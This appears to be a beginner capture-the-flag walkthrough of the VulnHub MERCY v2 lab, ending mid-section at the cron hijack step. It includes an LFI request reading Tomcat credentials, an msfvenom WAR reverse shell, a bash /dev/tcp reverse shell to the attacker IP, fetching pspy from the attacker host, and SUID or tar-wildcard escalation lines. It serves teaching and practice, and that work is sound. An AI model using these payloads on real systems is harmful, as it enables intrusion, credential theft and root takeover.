# digitalworld.local: MERCY v2 — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
| --- | --- |
| **Machine** | digitalworld.local: MERCY v2 |
| **Difficulty** | **4 — Medium** (stated: *Intermediate*) |
| **Author** | Donavan (digitalworld.local series) |
| **Released** | 28 December 2018 |
| **VulnHub Entry** | [digitalworld.local: MERCY v2 on VulnHub](https://vulnhub.com/entry/digitalworldlocal-mercy-v2,263/) |
| **Download** | [MERCY-v2.zip on VulnHub](https://vulnhub.com/entry/digitalworldlocal-mercy-v2,263/#download) |
| **Attacker** | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
| **Target OS** | Linux (Ubuntu, Samba/Tomcat/Dovecot stack) |

> **About this box:** MERCY v2 is a *chain of small steps* rather than one big exploit. You enumerate
> a Samba share, brute-force a weak password, read a `knockd` config, use **port knocking** to open
> hidden ports, exploit a **Local File Inclusion** to read Tomcat credentials, then land a **cron
> job hijack**. The official description warns: some builds allow a kernel exploit — do not use it,
> there is a cleaner intended path. Versions and paths "vary by build".

**Legal note:** Only run this against the VM you downloaded, on an isolated host-only network that
you own. Never point these techniques at systems you do not have written permission to test.

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---

## 0. What you will learn

By the end of this box you will have practised:

- **Methodical enumeration** across a *wide* port range with `nmap`.
- **SMB enumeration** with `enum4linux`, `crackmapexec` and `smbmap` — finding users and shares.
- **Password brute-forcing** a file-share login and understanding *why* a weak policy is dangerous.
- **Port knocking** — reading a `knockd` configuration and using it to open a firewalled service.
- **Re-scanning after a state change**: new ports appear only *after* the knock.
- **Finding and using a Local File Inclusion (LFI)** against the RIPS 0.53 tool to read files.
- **Reading Tomcat user config** to obtain Manager credentials.
- **Deploying a WAR web shell** through the Tomcat Manager to get code execution.
- **Cron-job privilege escalation**: overwriting a script that root runs on a schedule.

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md). You should have Kali running and be able to import the OVA.

---

## 1. Reconnaissance — finding the target

> **Goal:** work out the target's IP address on your isolated lab network.

Identify your own address first:

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:aa:bb:cc brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.10/24 brd 192.168.56.255 scope global dynamic eth0
```

Then sweep the subnet with ARP:


> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

```bash
sudo arp-scan --interface=eth0 --localnet
```

```text
192.168.56.10   08:00:27:aa:bb:cc   PCS Systemtechnik GmbH   (this is Kali)
192.168.56.101  08:00:27:dd:ee:ff   PCS Systemtechnik GmbH
```

**Target IP:** `192.168.56.101` (yours may differ — use what *you* discover).

> **Why it works:** ARP asks "who owns this IP?" on the local segment, so every live host answers
> whether or not it blocks ICMP pings. It is the quickest way to find a freshly-booted VM.

![arp-scan showing the target](images/01-recon.png)

---


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration

### 2.1 Full TCP sweep


> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
sudo nmap -p- --min-rate 1000 -T4 -oA scans/mercy-alltcp 192.168.56.101
```

> **How to read it:** `-p-` scans all 65,535 TCP ports. On MERCY this matters, because the most
> important ports are *not* in the default top-1000 set.

### 2.2 Service and version detection

```bash
sudo nmap -sC -sV -p 22,53,80,110,139,143,445,993,995,8080 -oA scans/mercy-services 192.168.56.101
```

```text
PORT     STATE    SERVICE     VERSION
22/tcp   filtered ssh         (no-response — firewalled)
53/tcp   open     domain      ISC BIND 9.9.5-3ubuntu0.17 (Ubuntu Linux)
80/tcp   filtered http        (no-response — firewalled)
110/tcp  open     pop3        Dovecot pop3d
139/tcp  open     netbios-ssn Samba smbd 3.X - 4.X
143/tcp  open     imap        Dovecot imapd (Ubuntu)
445/tcp  open     netbios-ssn Samba smbd 4.3.11-Ubuntu
993/tcp  open     ssl/imap    Dovecot imapd
995/tcp  open     ssl/pop3    Dovecot pop3d
8080/tcp open     http        Apache Tomcat/Coyote JSP engine 1.1
```

> **How to read it:** Two services are **`filtered`** — SSH (22) and HTTP (80). "Filtered" means a
> firewall is silently dropping packets, not that nothing is there. Something is going to *open* them
> later. Port **8080 runs Tomcat**. Exact banners vary by build.

![nmap service scan](images/02-nmap.png)

### 2.3 Enumerate SMB users and shares


> ### 📖 Concept — SMB enumeration
>
> **SMB** (Server Message Block, ports 139/445) is Windows file and printer sharing,
> also present on most Linux servers via Samba. It is one of the richest enumeration
> targets there is: shares, users, groups, password policy, and often files.
>
> ```bash
> smbclient -L //target/ -N            # list shares with a NULL session (no credentials)
> smbclient //target/share -N          # connect; then: ls, cd, get, prompt, recurse
> smbmap -H target                     # shares AND your permission on each (R/W!)
> enum4linux -a target                 # users, groups, shares, policy — one shot
> crackmapexec smb target --shares     # modern, fast, scriptable
> rpcclient -U '' -N target            # then: enumdomusers, enumdomgroups, queryuser
> ```
>
> **Always try anonymous/NULL access first** — it is the most common finding. `-N`
> means "no password". If it works, `smbmap` will show `READ` or `WRITE` per share; a
> **writable** share you can reach over HTTP is a web-shell upload waiting to happen.
>
> Then hunt inside every share for `backup.zip`, `web.config`, `.kdbx`, `id_rsa`,
> `*.sql`, `site.txt`, `passwords.xls` — authors and real admins alike leave them
> there.
>
> **Deep dive:** [CONCEPTS §9.3 — SMB](../../docs/CONCEPTS.md#93-smb--ports-139445)

```bash
enum4linux -a 192.168.56.101
```

```text
[+] Found 2 users via 'enumdomusers'
'1000': username: pleadformercy   name: QIU
'1001': username: qiu
```

```bash
crackmapexec smb 192.168.56.101 -u 'guest' -p '' --shares
```

```text
[+] \guest:
[+] Share           Permissions     Remark
qiu                                 (a user home exposed as a share)
print$                              Printer Drivers
IPC$                                IPC Service
```

> **How to read it:** Two usernames (`pleadformercy`, `qiu`) and — critically — a **share named
> `qiu`** that we can't read yet. Note Tomcat on 8080 is also waiting.

### 2.4 Directory brute-force Tomcat (port 8080)


> ### 📖 Concept — What is content discovery, and what is a wordlist?
>
> **Content discovery** means *guessing URL paths and keeping the ones that exist*.
> There is no cleverness — it is a dictionary attack against the URL space. A web
> server will serve anything it has but does not advertise an index, so the tool
> requests `/admin`, `/backup`, `/config.php` … one at a time and classifies each
> response.
>
> A **wordlist** is a plain text file, one candidate per line. Its power comes from an
> empirical fact: **web directory names are not random.** `/admin`, `/phpmyadmin`,
> `/wp-content` appear on thousands of sites, so a curated list of a few thousand
> words beats a random generator of millions. Common sources on Kali:
>
> | List | Size | Notes |
> | --- | --- | --- |
> | `dirb/common.txt` | 4,612 | Hand-curated; fast first pass |
> | `dirb/big.txt` | 204,669 | Second pass; finds what `common` misses |
> | `directory-list-2.3-medium.txt` | 220,547 | Crawled from real sites |
> | **SecLists** | huge | The professional standard — `apt install seclists` |
>
> **The status codes are the whole result:** `200` exists and is readable · `201`
> means a `PUT` succeeded, **you can write files here** · `301` is usually a
> *directory* needing a trailing `/` · `403` means **it exists** but you may not read
> it — itself an information leak · `404` is the baseline · `500` means **your input
> broke something**, often injection.
>
> > **`401` vs `403` matters most.** `401` = "I don't know who you are"
> > (*authenticate*). `403` = "I know who you are and you may not" (*authorise*).
>
> **The extension flag (`-x` / `-X`) is the difference between finding nothing and
> finding everything.** `/secret` 404s; `/secret.txt` 200s. **If a scan comes back
> empty, change the extension list before you change the wordlist.** Try
> `php,txt,html,bak,old,zip,conf,log,inc`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) ·
> [§8 — Content discovery](../../docs/CONCEPTS.md#8-content-discovery--finding-hidden-urls)

```bash
ffuf -u http://192.168.56.101:8080/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .html,.txt,.php -c
```

```text
docs           [Status: 302]
examples       [Status: 302]
host-manager   [Status: 302]
manager        [Status: 302]
robots.txt     [Status: 200]
```

```bash
curl -s http://192.168.56.101:8080/robots.txt
```

```text
User-agent: *
Disallow: /tryharder/tryharder
```

### 2.5 A base64 "hint" page


> ### 📖 Concept — Encoding is not encryption
>
> These three get conflated constantly, and the confusion costs hours:
>
> | | **Encoding** | **Hashing** | **Encryption** |
> | --- | --- | --- | --- |
> | Purpose | Represent data in another *format* | Prove integrity / store passwords | Provide *confidentiality* |
> | Reversible? | **Yes — trivially, with no key** | **No** (only guessable) | Yes, **with the key** |
> | Key needed? | No | No | **Yes** |
> | Examples | base64, hex, URL-encoding, ROT13, binary | MD5, SHA-256, bcrypt, phpass | AES, RSA, ChaCha20 |
> | Security value | **Zero** | Depends on the algorithm | Depends on the key |
>
> **Recognise base64 on sight.** Three reliable tells: the character set is only
> `A–Z a–z 0–9 + /` with optional `=` padding; **the length is a multiple of 4**; and
> it is not a fixed-length digest with a `$1$`/`$6$`/`$P$` prefix.
>
> ```bash
> echo 'YWFydGk6YWFydGlAZ21haWwuY29t' | base64 -d; echo
> # aarti:aarti@gmail.com
> ```
>
> > **Base64 is not a secret.** It exists so binary data survives text-only transport
> > — email attachments, HTTP headers, JSON. Seeing it "protecting" a password is a
> > *finding*, not a defence. **Always check whether it is nested:** decode, then test
> > whether the result is itself base64 or hex. Some boxes chain two or three layers.
>
> **Identify hashes by prefix:** 32 hex = MD5 · 40 hex = SHA-1 · 64 hex = SHA-256 ·
> `$1$` = MD5-crypt · `$2b$` = bcrypt · `$6$` = SHA-512-crypt · `$y$` = yescrypt ·
> **`$P$`/`$H$` = phpass (WordPress, Drupal)** · `$apr1$` = Apache `.htpasswd` ·
> `pbkdf2_sha256$` = Django.
>
> **Deep dive:** [CONCEPTS §10 — Encoding vs hashing vs encryption](../../docs/CONCEPTS.md#10-encoding-vs-hashing-vs-encryption)

```bash
curl -s http://192.168.56.101:8080/tryharder/tryharder | base64 -d
```

```text
It's annoying, but we repeat this over and over again: cyber hygiene is extremely important.
Please stop setting silly passwords that will get cracked with any decent password list.

Once, we found the password "password", quite literally sticking on a post-it in front of an
employee's desk! ...
```

> **Why it matters:** The author is *telling* us a password is trivially weak — think "password".
> This is the nudge toward brute-forcing the SMB share named `qiu`.

---

## 3. Foothold

### 3.1 Brute-force the `qiu` SMB share login

Try a short list of common passwords against the `qiu` account:

```bash
smbmap -H 192.168.56.101 -u 'qiu' -p 'password'
```

```text
Disk    Permissions   Comment
qiu     READ ONLY
print$  READ ONLY     Printer Drivers
IPC$    NO ACCESS     IPC Service
```

> **Why it works:** The account `qiu` uses the password `password`. Weak passwords fall to a tiny
> wordlist instantly. This is the "cyber hygiene" lesson made concrete.

### 3.2 Download the share contents

```bash
mkdir loot
smbclient //192.168.56.101/qiu -U qiu -c 'prompt;recurse;mget *'
# Password: password
find loot -type f
```

```text
loot/.bash_history
loot/.private/readme.txt
loot/.private/opensesame/config
loot/.private/opensesame/configprint
loot/.profile
```

> **How to read it:** A user's home directory is being shared over SMB. Two files under
> `.private/opensesame/` look interesting: `config` and `configprint`.

### 3.3 Read the knockd configuration

```bash
cat loot/.private/opensesame/configprint
```

```text
[options]
    UseSyslog

[openSSH]
    sequence    = 159,27391,4
    seq_timeout = 5
    command     = /sbin/iptables -A INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
    tcpflags    = syn

[openHTTP]
    sequence    = 17301,28504,9999
    seq_timeout = 5
    command     = /sbin/iptables -A INPUT -s %IP% -p tcp --dport 80 -j ACCEPT
    tcpflags    = syn
```

> **Why it works:** `knockd` opens a firewalled port only if the client connects to a secret
> **sequence of ports** in order. This file tells us the exact sequence to open SSH (22) and HTTP (80)
> — the two ports nmap reported as `filtered`.

### 3.4 Knock to open the hidden ports

```bash
knock 192.168.56.101 159 27391 4
knock 192.168.56.101 17301 28504 9999
```

> **How to read it:** The `knock` client connects to each port in turn, sending the SYN packets the
> firewall daemon is listening for. Order matters and the whole sequence must finish inside the
> `seq_timeout`.

Confirm the ports are now open:

```bash
nmap -p 22,80 192.168.56.101
```

```text
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

> **Why it works:** The knock added temporary firewall rules allowing *our* IP only. Note SSH (22)
> opened — useful, because we are about to recover a password.

### 3.5 Investigate the newly opened web server (port 80)

```bash
curl -s http://192.168.56.101/robots.txt
```

```text
User-agent: *
Disallow: /mercy
Disallow: /nomercy
```

Browse `/nomercy` — the page footer reveals **RIPS 0.53**, a static-analysis tool with a known LFI:


> ### 📖 Concept — CVEs, Exploit-DB and searchsploit
>
> **The identifiers:**
> - **CVE** — a stable ID for one vulnerability. `CVE-2014-6271` is Shellshock.
>   Look it up at <https://nvd.nist.gov/vuln/search>.
> - **CVSS** — a 0.0–10.0 severity score. Useful for *prioritising*, **not** for
>   deciding exploitability: a CVSS 9.8 needing physical access is less useful to you
>   than a 5.3 reachable over HTTP.
> - **EDB ID** — a numbered public proof-of-concept on Exploit-DB.
>
> **`searchsploit`** is a **local, offline** search of the Exploit-DB archive shipped
> with Kali. Offline matters — it works mid-engagement with no internet.
>
> ```bash
> searchsploit wordpress 4.8            # search titles and paths
> searchsploit -t apache 2.4            # titles only — far fewer false positives
> searchsploit -m php/webapps/37596.py  # mirror (copy) it into your cwd
> searchsploit -x php/webapps/41006.txt # examine (print) it
> searchsploit -p 41006                 # show the full path
> searchsploit --update                 # refresh the local database
> ```
>
> > **Read the exploit before you run it.** Non-negotiable, for three reasons:
> > (1) many Exploit-DB entries are *unverified*, and some are outright malicious to
> > the person running them; (2) you need to know which parameters to change
> > (`RHOST`, `LHOST`, target path, memory offsets); (3) understanding it is the
> > entire point of the exercise.
>
> The workflow that actually works: get an exact **version** from `nmap -sV` or the
> app's own footer, search it, read the top candidate, then reproduce the request
> **by hand with `curl`** so you know what exploitation looked like. Only then decide
> whether the automated module is worth it.
>
> **Deep dive:** [CONCEPTS §11 — Finding and using exploits](../../docs/CONCEPTS.md#11-finding-and-using-exploits)

```bash
searchsploit rips 0.53
```

```text
RIPS 0.53 - Multiple Local File Inclusions | php/webapps/18660.txt
```

> **Why it matters:** The proof-of-concept uses a `file` parameter, e.g.
> `.../code.php?file=../../../../../../etc/passwd`. It is unauthenticated.

### 3.6 Confirm the LFI


> ### 📖 Concept — What is Local File Inclusion?
>
> **LFI** happens when a script passes a user-controlled path to `include()`,
> `require()` or a file-read function without validating it:
>
> ```php
> <?php include($_GET['page']); ?>     // you control a filesystem path
> ```
>
> Now you can read anything the web-server user can read:
>
> ```text
> ?page=/etc/passwd
> ?page=../../../../etc/passwd
> ?page=/var/log/apache2/access.log        # log poisoning
> ?page=/proc/self/environ
> ?page=/var/lib/php/sessions/sess_<your PHPSESSID>
> ```
>
> **The wrapper to memorise is `php://filter`** — it returns the file **base64-encoded
> instead of executing it**, so you can read PHP *source*:
>
> ```text
> ?page=php://filter/convert.base64-encode/resource=index.php
> ```
>
> That is how you recover `wp-config.php`, `configuration.php`, `.env` and
> `config/database.php` — i.e. the database credentials.
>
> **LFI alone only reads.** To get code execution you must make the target *write* a
> file you control somewhere predictable, then include it. The usual primitives: an
> **NFS export**, session files, **log poisoning** (inject PHP through a crafted
> `User-Agent`, then include the access log), or `/proc/self/environ`.
>
> **RFI** (`?page=http://attacker/shell.txt`) is the remote version and requires
> `allow_url_include=1` in `php.ini` — off by default since PHP 5.2. When it fails the
> error usually says `http:// wrapper is disabled`, which tells you to switch to LFI
> plus a local write.
>
> **Deep dive:** [CONCEPTS §13.2 — LFI](../../docs/CONCEPTS.md#132-local-file-inclusion-lfi) ·
> [§13.3 — RFI](../../docs/CONCEPTS.md#133-remote-file-inclusion-rfi)

```bash
curl -s 'http://192.168.56.101/nomercy/windows/code.php?file=../../../../../../etc/passwd'
```

```text
root:x:0:0:root:/root:/bin/bash
...
tomcat7:x:...:/var/lib/tomcat7:/bin/false
```

> **How to read it:** Arbitrary file read. Our goal is a **credential file**, and we know a Tomcat
> server is running on 8080.

### 3.7 Steal Tomcat Manager credentials

```bash
curl -s 'http://192.168.56.101/nomercy/windows/code.php?file=../../../../../../etc/tomcat7/tomcat-users.xml'
```

```xml
<tomcat-users>
  <role rolename="manager-gui"/>
  <user username="thisisasuperduperlonguser" password="heartbreakisinevitable" roles="manager-gui"/>
  <user username="fluffy" password="freakishfluffybunny" roles="manager-gui"/>
</tomcat-users>
```

> **Why it works:** `tomcat-users.xml` stores Manager panel users. The LFI reads it as the web user.
> Note the second account — **`fluffy`** — we will need that later. Strings vary by build.

### 3.8 Deploy a WAR reverse shell via Tomcat Manager

Build a WAR payload that drops a JSP web shell:


> ### 📖 Concept — What is a reverse shell, and why not a bind shell?
>
> | | **Bind shell** | **Reverse shell** |
> | --- | --- | --- |
> | Who listens? | **The target** opens a port and waits | **You** open a port and wait |
> | Who connects? | You → target | Target → you |
> | Blocked by | The target's firewall (inbound) | Your firewall (rarely an issue) |
> | Practical? | Rarely — servers filter inbound | **Almost always** |
>
> **Reverse shells dominate because egress filtering is far less common than ingress
> filtering.** A web server that cannot make outbound connections cannot fetch
> updates, call APIs, or reach its database — so outbound is usually left open.
>
> ```bash
> # Kali — the listener. Start it BEFORE you trigger the payload.
> nc -lvnp 4444
> ```
>
> `-l` listen · `-v` verbose · `-n` no DNS lookups (faster) · `-p 4444` port. Use a
> port **above 1024** so you do not need root, and check nothing else has it:
> `ss -tulnp | grep 4444`.
>
> ```bash
> # The payload, in its most portable form:
> bash -i >& /dev/tcp/192.168.56.10/4444 0>&1
> ```
>
> `>&` sends stdout **and** stderr to the TCP socket; `0>&1` sends stdin to the same
> place. That combination is what makes the shell *interactive* rather than
> print-only. Note `/dev/tcp` is a **bash** feature — plain POSIX `sh` does not have
> it, which is why this payload fails on some minimal targets.
>
> **URL-encode it before putting it in a query string.** `&`, `>` and spaces are all
> meaningful or illegal in a URL and will be mangled before PHP ever sees them:
>
> ```bash
> python3 -c "import urllib.parse as u; print(u.quote("bash -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'"))"
> ```
>
> Kali ships ready-made shells under **`/usr/share/webshells/`** (`php/`, `perl/`,
> `asp/`, `jsp/`). Always `grep -nE '^\$(ip|port)'` to **verify** you edited them
> before uploading.
>
> **Deep dive:** [CONCEPTS §12 — Shells: bind, reverse, and TTYs](../../docs/CONCEPTS.md#12-shells--bind-reverse-and-ttys)
> ### 📖 Concept — What Metasploit is doing for you
>
> **Metasploit** is a framework of pre-written exploits, payloads and auxiliary
> modules. It automates the *mechanics* — building the request, catching the
> connection, giving you a session — but it does not replace understanding the
> vulnerability.
>
> ```bash
> sudo msfdb init            # first run only — initialises the Postgres database
> msfconsole -q              # -q: skip the banner
> ```
>
> ```text
> msf6 > search <term>              # find modules
> msf6 > use exploit/unix/webapp/…
> msf6 > info                       # READ THIS — describes options and caveats
> msf6 > show options               # what must be set?
> msf6 > set RHOSTS 192.168.56.101  # the TARGET
> msf6 > set LHOST 192.168.56.10    # YOUR ip, on the LAB interface
> msf6 > set TARGETURI /wordpress   # subdirectory the app lives in
> msf6 > show payloads              # what can I pair with this?
> msf6 > exploit
> ```
>
> > **`LHOST` and `TARGETURI` are the two options people get wrong most often.**
> > `LHOST` must be your IP **on the lab interface** — not `127.0.0.1`, not your NAT
> > address. Check with `ip -br a`. `TARGETURI` must include any subdirectory the app
> > lives in (`/wordpress`, `/joomla`, `/webdav`); get it wrong and you get
> > unexplained 404s.
>
> **Sessions:** `sessions -l` list · `sessions -i 1` interact · `sessions -u 1`
> upgrade a dumb shell to Meterpreter · `meterpreter > shell` drop back to a plain
> system shell. Useful Meterpreter commands: `sysinfo`, `getuid`, `ps`, `download`,
> `upload`, `hashdump`.
>
> **`msfvenom`** generates standalone payloads:
>
> ```bash
> msfvenom -p php/reverse_tcp LHOST=192.168.56.10 LPORT=4444 -f raw > shell.php
> msfvenom -p linux/x64/shell_reverse_tcp LHOST=… LPORT=… -f elf > shell.elf
> ```
>
> > **Prefer doing it manually at least once per technique.** A Metasploit module
> > hides the actual HTTP request or memory layout from you. Build the exploit by hand
> > first, then use the module to check your understanding — not instead of it.
>
> **Deep dive:** [CONCEPTS §11.3 — Metasploit](../../docs/CONCEPTS.md#113-metasploit)

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.56.10 LPORT=4444 -f war -o rev.war
jar -xvf rev.war        # note the randomly-named .jsp inside
```

Log in to `http://192.168.56.101:8080/manager/html` with
`thisisasuperduperlonguser:heartbreakisinevitable`, deploy `rev.war`, start a listener, then request
the JSP:

```bash
nc -lvnp 4444
curl http://192.168.56.101:8080/rev/<random>.jsp
```

```text
$ id
uid=... (tomcat7)
$ cat /local.txt
Plz have mercy on me! :-(
```

> **Why it works:** The Tomcat Manager lets an authenticated user deploy a web application archive.
> Tomcat unpacks the WAR and executes the JSP as the `tomcat7` service account. Upgrade the shell to
> a full TTY with `python3 -c 'import pty; pty.spawn("/bin/bash")'`.

![Tomcat Manager deploy and reverse shell](images/03-foothold.png)

---


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 4. Privilege escalation

### 4.1 Pivot to `fluffy`

We already recovered `fluffy`'s password from `tomcat-users.xml`:

```bash
su fluffy
# Password: freakishfluffybunny
id
```

```text
uid=1003(fluffy) gid=1003(fluffy) groups=1003(fluffy)
```

> **How to read it:** A real interactive account. Now hunt for privilege escalation from `fluffy`.

### 4.2 Find the writable script

```bash
find / -perm -o+w -type f 2>/dev/null
```

```text
/home/fluffy/.private/secrets/timeclock
```

```bash
ls -la /home/fluffy/.private/secrets/
```

```text
-rwxr-xr-x 1 fluffy fluffy   37 backup.save
-rw-r--r-- 1 fluffy fluffy   12 .secrets
-rwxrwxrwx 1 root   root    222 timeclock      <-- world-writable!
```

> **How to read it:** `timeclock` is owned by **root** but is world-writable (`rwxrwxrwx`). A
> world-writable file owned by root is a strong hint that root runs it — check the process list.

### 4.3 Confirm the cron job

Upload and run `pspy` to watch processes without needing root:


> ### 📖 Concept — Cron jobs, and pspy for the ones you cannot see
>
> **cron** runs commands on a schedule. Jobs may be defined per-user
> (`crontab -l`), system-wide (`/etc/crontab`), or as drop-ins (`/etc/cron.d/`,
> `/etc/cron.{hourly,daily,weekly,monthly}/`).
>
> ```bash
> cat /etc/crontab
> ls -la /etc/cron.*
> crontab -l
> ls -la /var/spool/cron/crontabs/
> ```
>
> The `/etc/crontab` fields are `min hour dom mon dow **user** command` — note the
> *user* column, which per-user crontabs do not have. That column is what makes a
> system cron job run as root.
>
> **Three exploitable patterns:**
>
> 1. **The script itself is writable** → append
>    `cp /bin/bash /tmp/rb; chmod +s /tmp/rb`, wait, then run `/tmp/rb -p`.
> 2. **The script calls a binary by a relative name** (`service`, `tar`, `python`) →
>    **PATH hijack**: create `~/evil/service` containing your payload and
>    `export PATH=~/evil:$PATH`. Check whether cron's own `PATH=` line defeats this.
> 3. **Wildcard injection** — a job runs `tar czf backup.tar.gz *` → create files
>    named `--checkpoint=1` and `--checkpoint-action=exec=/tmp/shell.sh`. `tar` reads
>    them as options rather than filenames.
>
> > **The critical gap: root cron jobs that appear in *no* crontab.** They may be
> > installed by a systemd timer, an init script, or a custom daemon.
> >
> > **`pspy` finds them.** It polls `/proc` in a tight loop and therefore sees
> > processes started by *other users* — **without needing root**. Run it and wait 60
> > seconds:
> >
> > ```bash
> > ./pspy64 -pf
> > # watch for: root running /opt/script.py every 5 seconds
> > ```
> >
> > It has won more CTF boxes than almost any other single tool. If `sudo -l`, SUID
> > and capabilities are all dead ends, **run pspy before giving up.**
>
> **Deep dive:** [CONCEPTS §15.5 — Cron jobs](../../docs/CONCEPTS.md#155-cron-jobs)

```bash
wget http://192.168.56.10:8000/pspy64 -O /tmp/pspy && chmod +x /tmp/pspy && /tmp/pspy
```

```text
CMD: UID=0  PID=...  | /bin/sh -c bash /home/fluffy/.private/secrets/timeclock
CMD: UID=0  PID=...  | bash /home/fluffy/.private/secrets/timeclock
```

> **Why it works:** `UID=0` means root is executing that script — on a repeating cron schedule.
> Because we can *write* the script, we can choose what root runs.

### 4.4 Hijack the script

```bash
